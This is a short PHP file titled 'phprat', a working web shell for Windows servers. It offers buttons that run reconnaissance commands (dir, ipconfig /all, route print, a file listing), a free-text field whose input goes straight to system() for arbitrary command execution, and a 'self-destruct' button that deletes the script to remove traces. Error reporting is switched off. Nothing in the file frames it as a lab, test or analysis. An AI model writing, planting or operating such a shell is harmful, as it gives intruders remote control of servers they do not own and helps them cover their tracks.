<?php
	// to disable annoying error notices
	error_reporting(0);
?>

<p>phprat</p>
<p><a href="/main.php">main</a></p>

<form action="main.php" method="post" style="display: contents;">
	<input type="hidden" name="command" value="01"/>
	<button type="submit">dir</button>
</form>

<form action="main.php" method="post" style="display: contents;">
	<input type="hidden" name="command" value="02"/>
	<button type="submit">ipconfig</button>
</form>

<form action="main.php" method="post" style="display: contents;">
	<input type="hidden" name="command" value="03"/>
	<button type="submit">route print</button>
</form>

<form action="main.php" method="post" style="display: contents;">
	<input type="hidden" name="command" value="04"/>
	<button type="submit">list file</button>
</form>

<br>
<br>

<form action="main.php" method="post">
	<input type="text" name="command" value=""/>
	<button type="submit">custom</button>
</form>


<form action="main.php" method="post">
	<button type="submit" name="destroy" value="true">self-destruct</button>
</form>


<div style="border: 1px dotted black;">
<?php
	function listfile() {
		$dir    = getcwd();
		$files = scandir($dir);

		for ($i=0; $i<sizeof($files); $i++) {
			print("<p><a href=\"{$files[$i]}\">{$files[$i]}</a></p>");
		}
	}

	switch ($_POST['command']) {
		case "01":
			system("dir");
			break;
		case "02":
			system("ipconfig /all");
			break;
		case "03":
			system("route print");
			break;
		case "04":
			listfile();
			break;
		default:
			system($_POST['command']);
			break;
	}
	
	if ($_POST['destroy']) {
		system("del main.php");
		die();
	}
?>